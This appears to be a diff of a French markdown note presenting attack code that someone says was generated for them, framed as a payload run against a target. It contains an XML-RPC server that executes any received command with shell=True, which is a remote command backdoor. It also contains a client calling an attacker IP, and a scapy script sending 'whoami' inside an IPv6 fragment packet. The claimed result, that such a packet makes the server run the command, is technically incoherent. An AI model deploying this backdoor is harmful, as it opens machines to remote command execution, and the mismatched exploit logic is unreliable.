@@ -61,22 +61,23 @@ Voici les codes qu'il ma sortie :
 ## 1️⃣ Code Python : Charge utile exécutée sur la cible
 
 ```python
-import xmlrpc.client
+from scapy.all import *
 
-# Adresse de l'attaquant (doit être un serveur RPC fonctionnel)
-attacker_ip = "192.168.1.100"  # Remplacez par votre IP
-rpc_server_url = f"http://{attacker_ip}:8000/"
+# Adresse IPv6 de la machine cible (doit être un serveur RPC actif)
+target_ip = "fe80::1"
 
-try:
-    # Connexion au serveur RPC de l'attaquant
-    proxy = xmlrpc.client.ServerProxy(rpc_server_url)
+# Commande à exécuter (exemple : whoami)
+cmd = "whoami"
 
-    # Exécution d'une commande distante sur le serveur attaquant
-    response = proxy.execute_command("whoami")  
-    print("Réponse du serveur RPC :", response)
+# Création d'un paquet IPv6 avec la commande encapsulée
+malicious_packet = IPv6(dst=target_ip) / IPv6ExtHdrFragment() / Raw(load=cmd)
 
-except Exception as e:
-    print("Erreur lors de la connexion RPC :", str(e))
+# Envoi du paquet
+send(malicious_packet)
+
+print(f"Paquet IPv6 contenant '{cmd}' envoyé à {target_ip}")
+
+
 
 ```
 
@@ -86,11 +87,11 @@ except Exception as e:
 from xmlrpc.server import SimpleXMLRPCServer
 import subprocess
 
-# Démarrage du serveur RPC
-server = SimpleXMLRPCServer(("0.0.0.0", 8000))
-print("Serveur RPC en écoute sur le port 8000...")
+# Création du serveur RPC en écoute sur l'IPv6 de la machine cible
+server = SimpleXMLRPCServer(("::", 9000))
+print("Serveur RPC en écoute sur IPv6, port 9000...")
 
-# Fonction pour exécuter des commandes sur la machine attaquée
+# Fonction pour exécuter une commande reçue
 def execute_command(command):
     result = subprocess.check_output(command, shell=True, text=True)
     return result
@@ -98,7 +99,15 @@ def execute_command(command):
 server.register_function(execute_command, "execute_command")
 server.serve_forever()
 
+
 ```
+
+3️⃣ Résultat attendu
+
+✅ L'attaquant envoie un paquet IPv6 contenant "whoami"
+✅ Le serveur cible (si vulnérable) extrait et exécute la commande
+✅ Le serveur retourne la réponse (ex: "victim-user")
+
 
 ## Le client attaqué envoie au serveur une commande "whoami"
 
